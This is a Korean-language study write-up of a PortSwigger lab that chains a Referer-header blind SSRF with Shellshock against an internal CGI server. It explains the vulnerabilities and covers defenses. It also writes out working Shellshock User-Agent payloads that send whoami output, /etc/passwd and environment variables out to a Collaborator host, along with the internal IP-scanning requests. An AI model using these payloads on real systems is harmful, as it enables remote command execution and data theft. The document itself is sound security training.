# Lab: Blind SSRF with Shellshock exploitation

## 개요

- **난이도**: Expert
- **주제**: Blind SSRF — Referer 헤더 / Shellshock (CVE-2014-6271) / OOB 데이터 탈취
- **링크**: https://portswigger.net/web-security/ssrf/blind/lab-shellshock-exploitation

## 목표

Referer 헤더 기반 Blind SSRF 로 내부 서버(`192.168.0.X:8080`)를 스캔하고, 해당 서버의 CGI 스크립트에 있는 Shellshock 취약점을 통해 OS 사용자 이름을 Burp Collaborator 로 탈취한다.

## 003 랩(Blind SSRF OOB 탐지)과의 차이

```
[003 랩 — Blind SSRF OOB 탐지]
  목적: SSRF 취약점 존재 확인
  방법: Referer → Collaborator DNS/HTTP ping
  결과: 취약점 탐지만 (데이터 탈취 없음)

[006 랩 (이번) — Blind SSRF + Shellshock]
  목적: 내부 서버 OS 사용자 이름 탈취
  방법: Referer → 내부 IP 스캔
         → 내부 서버 CGI Shellshock 실행
         → whoami 결과를 Collaborator 로 전송
  결과: 실제 데이터(사용자명) 탈취
```

## Shellshock (CVE-2014-6271)

### 취약점 개요

```
Bash 가 환경변수에서 함수 정의를 파싱할 때, 함수 정의 뒤에 오는
임의 명령어도 함께 실행하는 버그.

취약한 Bash 버전: 4.3 이하 (2014년 9월 패치)

페이로드 형식:
  () { :; }; <실행할 명령>

  () { :; };  →  빈 함수 정의 (bash 가 파싱)
  ;           →  구분자
  <명령>      →  함수 정의 후 실행되는 임의 코드
```

### CGI 와 Shellshock 의 연결

```
CGI(Common Gateway Interface) 동작:
  웹 서버가 HTTP 요청을 스크립트로 전달할 때
  HTTP 헤더를 환경변수로 변환:

    User-Agent  →  HTTP_USER_AGENT
    Referer     →  HTTP_REFERER
    Cookie      →  HTTP_COOKIE

CGI 스크립트가 bash 로 실행되면:
  환경변수를 bash 가 파싱
  → User-Agent 값에 Shellshock 페이로드가 있으면
  → bash 가 해당 명령을 실행

취약 조건:
  1. 웹 서버가 CGI 사용
  2. CGI 스크립트가 bash 로 실행됨 (#!/bin/bash)
  3. bash 버전이 취약 (4.3 이하)
```

## 공격 흐름

### 1단계 — Blind SSRF 진입점 확인 (003 랩과 동일)

상품 페이지 요청에서 Referer 헤더를 Burp Collaborator 주소로 변경:

```http
GET /product?productId=1 HTTP/1.1
Host: LAB-ID.web-security-academy.net
Referer: https://BURP-COLLABORATOR-SUBDOMAIN/
```

Collaborator 에 DNS/HTTP 인터랙션 확인 → Referer 기반 Blind SSRF 존재.

### 2단계 — 내부 IP 스캔 + Shellshock 페이로드 동시 전송

Burp Intruder 로 Referer 에 내부 IP 대역을 순회하면서,
User-Agent 에 Shellshock 페이로드를 삽입한다:

```http
GET /product?productId=1 HTTP/1.1
Host: LAB-ID.web-security-academy.net
Referer: http://192.168.0.§1§:8080/
User-Agent: () { :; }; /bin/bash -c 'curl http://BURP-COLLABORATOR-SUBDOMAIN/$(whoami)'
```

```
Intruder 설정:
  Attack type: Sniper
  페이로드 위치: Referer 의 IP 마지막 옥텟 (§1§)
  페이로드 목록: 1 ~ 255 (숫자)
```

### 3단계 — 공격 체인 동작 원리

```
[공격자]
  Intruder → GET /product?productId=1
             Referer: http://192.168.0.X:8080/
             User-Agent: () { :; }; curl COLLABORATOR/$(whoami)
         ↓
[프론트엔드 서버 — Analytics 처리]
  Referer URL 을 서버 측에서 fetch
  GET http://192.168.0.X:8080/
         ↓
[내부 서버 (192.168.0.X:8080) — CGI]
  HTTP_USER_AGENT 환경변수 = () { :; }; curl COLLABORATOR/$(whoami)
  bash 가 환경변수 파싱 → Shellshock 발동
  curl http://COLLABORATOR/peter (whoami 실행 결과 포함)
         ↓
[Burp Collaborator]
  GET /peter  수신
  → OS 사용자 이름: peter
```

### 4단계 — Collaborator 에서 결과 확인

Burp Collaborator → "Poll now" 클릭:

```
HTTP 인터랙션:
  GET /peter HTTP/1.1
  Host: BURP-COLLABORATOR-SUBDOMAIN

→ URL 경로에서 사용자 이름 추출: peter
```

## Blind SSRF + Shellshock 의 조합이 위험한 이유

```
[단계별 취약점 체인]

  1. Blind SSRF (Referer)
     방화벽 외부 공격자 → 내부 네트워크 접근

  2. 내부 IP 스캔
     내부 서버 식별 (192.168.0.X:8080)

  3. Shellshock (CGI)
     내부 서버에서 임의 OS 명령 실행

  4. OOB 데이터 탈취 (curl → Collaborator)
     실행 결과를 외부로 반출

각 취약점 단독으로는 제한적이지만
연쇄하면 외부에서 내부 서버 OS 명령 실행 + 결과 탈취 가능
```

## 방어

### Shellshock 방어

```
1. Bash 패치
   CVE-2014-6271 패치 버전으로 업그레이드

2. CGI 에서 bash 사용 제거
   #!/bin/bash → #!/bin/sh 또는 다른 언어로 대체

3. HTTP 헤더 환경변수 전달 제한
   ModSecurity 등 WAF 로 페이로드 패턴 차단
   () { 로 시작하는 헤더 값 거부
```

### SSRF 방어

```
Referer 헤더 기반 fetch 제거 또는 화이트리스트:
  fetch(request.headers.referer)  ← 제거
  → 로깅만 수행하고 실제 HTTP 요청 금지

내부 IP 대역 차단 (방화벽 레벨):
  10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16 → 서버 아웃바운드 차단
```

## 핵심 정리

- Referer 헤더 기반 Blind SSRF 는 데이터가 응답에 반영되지 않아도, 내부 서버를 공격하는 **보조 채널**로 활용할 수 있다.
- Shellshock 는 HTTP 헤더(`User-Agent`)가 CGI 환경변수로 전달되는 경로를 이용해 OS 명령을 실행한다.
- 결과는 응답으로 반환되지 않으므로 `curl`/`nslookup` 로 Burp Collaborator 에 **OOB 전송**한다.
- Blind SSRF → 내부 IP 스캔 → Shellshock → OOB 탈취로 이어지는 **취약점 체인**의 전형적인 사례다.

## 배운 점 및 추가 학습

### 1. Shellshock 페이로드 변형

```bash
# HTTP 요청으로 탈취 (결과를 URL 경로에 포함)
() { :; }; /bin/bash -c 'curl http://COLLABORATOR/$(whoami)'

# DNS 조회로 탈취 (HTTP 막혀 있을 때)
() { :; }; /bin/bash -c 'nslookup $(whoami).COLLABORATOR'

# 파일 내용 탈취
() { :; }; /bin/bash -c 'curl http://COLLABORATOR/$(cat /etc/passwd | base64)'

# 환경변수 확인 (어떤 변수가 주입되는지 확인)
() { :; }; /bin/bash -c 'curl http://COLLABORATOR/$(env | base64)'
```

### 2. CGI 에서 환경변수로 변환되는 헤더 목록

```
User-Agent     → HTTP_USER_AGENT     ← Shellshock 가장 많이 사용
Referer        → HTTP_REFERER
Cookie         → HTTP_COOKIE
Accept         → HTTP_ACCEPT
Host           → HTTP_HOST
X-Custom       → HTTP_X_CUSTOM
```

### 3. OOB 탈취 도구 비교

```
[Burp Collaborator]
  DNS + HTTP + SMTP 인터랙션 모두 수신
  Burp Suite Pro 필요
  가장 편리 (인터랙션 즉시 확인)

[interactsh (오픈소스)]
  interactsh-client 로 서브도메인 생성
  DNS/HTTP 수신, 무료
  CLI 기반

[canarytokens.org]
  웹 기반, 간단한 HTTP/DNS 토큰
  DNS 는 제한적

[webhook.site]
  HTTP 요청만 수신
  DNS 불가
```

### 4. 001~006 랩 SSRF 비교

| 항목 | 001 | 002 | 003 | 004 | 005 | 006 |
|------|-----|-----|-----|-----|-----|-----|
| 진입점 | URL 파라미터 | URL 파라미터 | Referer | URL 파라미터 | URL 파라미터 | Referer |
| 응답 반영 | O | O | X | O | O | X |
| 필터 | 없음 | 없음 | 없음 | 블랙리스트 | 화이트리스트 | 없음 |
| 우회 | 불필요 | IP 스캔 | — | 축약형+인코딩 | Open Redirect | — |
| 심화 기법 | — | — | OOB 탐지 | — | — | Shellshock+OOB탈취 |
| 난이도 | Apprentice | Apprentice | Practitioner | Practitioner | Practitioner | Expert |
